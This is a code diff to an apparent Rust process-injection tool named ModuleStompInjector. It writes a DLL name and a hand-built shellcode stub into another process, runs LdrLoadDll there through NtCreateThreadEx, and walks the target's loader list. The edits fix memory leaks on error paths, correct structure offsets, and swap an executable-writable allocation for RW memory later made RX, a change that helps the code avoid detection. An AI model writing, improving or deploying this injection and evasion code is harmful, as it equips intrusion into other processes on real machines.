@@ -120,6 +120,7 @@ impl Injector for ModuleStompInjector {
             // Write wide DLL name
             let mut written = 0usize;
             if WriteProcessMemory(h_proc, remote_buf, wide.as_ptr() as _, wide_bytes, &mut written) == 0 {
+                winapi::um::memoryapi::VirtualFreeEx(h_proc, remote_buf, 0, winapi::um::winnt::MEM_RELEASE);
                 CloseHandle(h_proc);
                 return Err(anyhow!("WriteProcessMemory wide string failed"));
             }
@@ -134,6 +135,7 @@ impl Injector for ModuleStompInjector {
             // bytes 4..8 = padding
             us_bytes[8..16].copy_from_slice(&(remote_str_va as u64).to_le_bytes());   // Buffer pointer
             if WriteProcessMemory(h_proc, remote_us_ptr, us_bytes.as_ptr() as _, 16, &mut written) == 0 {
+                winapi::um::memoryapi::VirtualFreeEx(h_proc, remote_buf, 0, winapi::um::winnt::MEM_RELEASE);
                 CloseHandle(h_proc);
                 return Err(anyhow!("WriteProcessMemory UNICODE_STRING failed"));
             }
@@ -158,8 +160,9 @@ impl Injector for ModuleStompInjector {
             // We'll write stub + us + base_addr into a separate RWX region.
 
             let ldr_addr = ldr_load_dll_ptr as u64;
-            let stub_region = VirtualAllocEx(h_proc, std::ptr::null_mut(), 256, MEM_COMMIT | MEM_RESERVE, winapi::um::winnt::PAGE_EXECUTE_READWRITE);
+            let stub_region = VirtualAllocEx(h_proc, std::ptr::null_mut(), 256, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
             if stub_region.is_null() {
+                winapi::um::memoryapi::VirtualFreeEx(h_proc, remote_buf, 0, winapi::um::winnt::MEM_RELEASE);
                 CloseHandle(h_proc);
                 return Err(anyhow!("VirtualAllocEx failed for LdrLoadDll stub"));
             }
@@ -196,22 +199,31 @@ impl Injector for ModuleStompInjector {
             stub.push(0xC3);
 
             if WriteProcessMemory(h_proc, stub_region, stub.as_ptr() as _, stub.len(), &mut written) == 0 {
+                winapi::um::memoryapi::VirtualFreeEx(h_proc, stub_region, 0, winapi::um::winnt::MEM_RELEASE);
+                winapi::um::memoryapi::VirtualFreeEx(h_proc, remote_buf, 0, winapi::um::winnt::MEM_RELEASE);
                 CloseHandle(h_proc);
                 return Err(anyhow!("WriteProcessMemory LdrLoadDll stub failed"));
             }
+
+            // Switch stub memory from RW to RX now that all bytes are written.
+            let mut _old_prot = 0u32;
+            winapi::um::memoryapi::VirtualProtectEx(h_proc, stub_region, stub.len(), winapi::um::winnt::PAGE_EXECUTE_READ, &mut _old_prot);
 
             let mut h_thread: *mut winapi::ctypes::c_void = std::ptr::null_mut();
             let status = build_thread(&mut h_thread, 0x1FFFFF, std::ptr::null_mut(), h_proc, stub_region, std::ptr::null_mut(), 0, 0, 0, 0, std::ptr::null_mut());
             if status >= 0 && !h_thread.is_null() {
                 winapi::um::synchapi::WaitForSingleObject(h_thread, winapi::um::winbase::INFINITE);
                 CloseHandle(h_thread);
-                // Free the RWX stub region once the thread has finished (2.6)
+                // Free the stub region and remote argument buffer now that LdrLoadDll has returned.
                 winapi::um::memoryapi::VirtualFreeEx(h_proc, stub_region, 0, winapi::um::winnt::MEM_RELEASE);
+                winapi::um::memoryapi::VirtualFreeEx(h_proc, remote_buf, 0, winapi::um::winnt::MEM_RELEASE);
                 // Free the unused us_region allocation as well (2.6)
                 if !us_region.is_null() {
                     winapi::um::memoryapi::VirtualFreeEx(h_proc, us_region, 0, winapi::um::winnt::MEM_RELEASE);
                 }
             } else {
+                winapi::um::memoryapi::VirtualFreeEx(h_proc, stub_region, 0, winapi::um::winnt::MEM_RELEASE);
+                winapi::um::memoryapi::VirtualFreeEx(h_proc, remote_buf, 0, winapi::um::winnt::MEM_RELEASE);
                 CloseHandle(h_proc);
                 return Err(anyhow!("NtCreateThreadEx for LdrLoadDll stub failed: {:x}", status));
             }
@@ -267,8 +279,8 @@ impl Injector for ModuleStompInjector {
                 // LDR_DATA_TABLE_ENTRY (InLoadOrder):
                 //   +0x00: Flink, +0x08: Blink
                 //   +0x30: DllBase
-                //   +0x58: FullDllName UNICODE_STRING (Length u16 +0, MaxLen u16 +2, Buffer *u16 +8)
-                //   +0x48: BaseDllName UNICODE_STRING
+                //   +0x48: FullDllName UNICODE_STRING (Length u16 +0, MaxLen u16 +2, Buffer *u16 +8)
+                //   +0x58: BaseDllName UNICODE_STRING
                 let mut entry = [0u8; 0x70];
                 if ReadProcessMemory(h_proc, current as _, entry.as_mut_ptr() as _, entry.len(), &mut bytes_read) == 0 {
                     break;
